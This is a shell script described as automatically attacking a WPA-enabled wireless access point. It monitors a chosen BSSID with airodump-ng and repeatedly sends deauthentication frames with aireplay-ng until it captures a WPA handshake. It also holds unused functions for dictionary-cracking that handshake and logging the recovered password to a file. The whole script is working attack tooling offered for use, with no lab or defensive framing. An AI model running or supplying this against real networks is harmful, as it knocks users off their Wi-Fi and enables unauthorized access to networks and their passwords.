# Filename - WPA.sh
# Description - Automatically runs an attack against a WPA-enabled AP.
# Command - sudo sh WPA.sh -b $BSSID -c $CHANNEL -e $ESSID -i $INTERFACE -m $MONITOR_INTERFACE
# Example - sudo sh ./WPA.sh -b 20:AA:4B:D9:5C:76 -c 6 -e CISCO_AP -i wlan2 -m wlan2mon

#!/bin/sh

#Command Line Arguments
while getopts "b:c:e:i:m:" OPTION; do
	case "$OPTION" in
		b)
			BSSID=$OPTARG #-b $BSSID
			;;
		c)
			CHANNEL=$OPTARG #-c $CHANNEL
			;;
		e)
			ESSID=$OPTARG #-e $ESSID
			;;
		i)
			INT=$OPTARG #-i $INT
			;;
		m)
			MONINT=$OPTARG #-m $MONINT
			;;
	esac
done

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ] || [ -z "$ESSID" ] || [ -z "$INT" ] || [ -z "$MONINT" ]; then
	echo "An argument is empty, please try again."
	exit
fi

#===Variables===
prefix=$ESSID
filename="$prefix-01.cap"
captured=false


Monitor()
{
	#Monitoring SSID
	airodump-ng -c "$CHANNEL" -w "$prefix" --bssid "$BSSID" "$MONINT" &
	sleep 5
}

Handshake()
{
	aireplay-ng --deauth 5 -a "$BSSID" "$MONINT" &
	sleep 5

	#HANDSHAKE
	capture="$(aircrack-ng "$filename" | grep handshake | grep "$BSSID")"
	falsecapture="$(aircrack-ng "$filename" | grep "0 handshake" | grep "$BSSID")"

	while ! $captured; do
	{
		sleep 1
		if [ -z "$capture" ] || ! [ -z "$falsecapture" ]; then
			aireplay-ng --deauth 5 -a "$BSSID" "$MONINT" &
			sleep 5
			capture="$(aircrack-ng $ESSID*.cap | grep handshake | grep "$BSSID")"
			falsecapture="$(aircrack-ng $ESSID*.cap | grep "0 handshake" | grep "$BSSID")"
		else
			captured=true
		fi
	}
	done
1
	pkill -f aireplay-ng
	pkill -f airodump-ng
}

Cracking()
{
	#Temporary way to crack WPA with a dictionary // Will update this function later
	#Exporting cap filename to txt, importing name in python script to save the handshake for later use
	echo $filename > ./input.txt
	python ./Dependencies/cleanh.py &
	proc1=$!
	wait "$proc1"
}

ExportKey()
{
	T="$(($(date +%s)-T))"
	KEY="$(cat ./pass.txt)"

	if ! [ -e key.txt ]; then
		echo "BSSID\tESSID\tKey\tChannel\tTime(sec)\tEncryption\n$BSSID,$ESSID,$KEY,$CHANNEL,${T},WPA" > ./key.txt
	else
		echo "$BSSID,$ESSID,$KEY,$CHANNEL,${T},WPA" >> ./key.txt
	fi
}

SaveHandshake()
{
	EXISTS=true
	increment=1
	filename="$(cat ./input.txt)"
	ESSID="$(cat ./input.txt | grep -oP '^[^.]+(?=(\.cap)?$)')"
	today="$(date +'%d-%m-%Y')"
	new_name="$ESSID"_"$today"_"$increment.cap"

	while $EXISTS; do
	{
	    if [ -e "./Handshakes/$new_name" ]; then
	      increment=$((increment+1))
	      new_name="$ESSID"_"$today"_"$increment.cap"
	    else
	      EXISTS=false
	    fi
	}
	done

	mv ./"$filename" "$new_name"
	mv ./"$new_name" ./Handshakes/

}

Cleanup()
{
	echo "CLEANUP" >> debug.txt
	clear

	rm -f ./$ESSID*.csv
	rm -f ./$ESSID*.kismet.*
	rm -f ./test3.txt
	rm -f ./pass.txt
	rm -f ./hashcat.pot
	rm -f ./debug.txt
	rm -f ./cleanh.hccap
	rm -f ./cleancap.cap
	rm -f ./input.txt
	#rm -f ./$filename #WPA-Handshake

	clear
	echo "Cleanup Complete"
	echo "Password = $KEY"
}

#MAIN
#Start
Monitor
Handshake
#Cracking
#ExportKey
#SaveHandshake
#Cleanup
